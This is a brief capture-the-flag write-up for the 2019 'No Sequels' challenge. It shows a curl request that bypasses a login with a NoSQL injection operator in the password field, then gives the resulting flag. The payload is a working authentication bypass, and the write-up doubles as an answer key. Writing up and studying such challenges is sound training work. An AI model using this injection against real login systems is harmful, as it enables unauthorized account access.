# No Sequels
This was a basic NoSQL Injection task.
```shell
curl -i https://nosequels.2019.chall.actf.co/login \
-H 'Content-type: application/json' \
-d '{"username": "admin", "password": {"$gt": "a"}}' \
-H 'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdXRoZW50aWNhdGVkIjpmYWxzZSwiaWF0IjoxNTU1NzE4OTc5fQ.-YQh71DMt2mRIwKmgAKIB16rliriYF4dSilCsYo84-8'
```
After executing the above command we get a session cookie for the admin and when visiting the `https://nosequels.2019.chall.actf.co/site` we get the flag.
**actf{no_sql_doesn't_mean_no_vuln}**
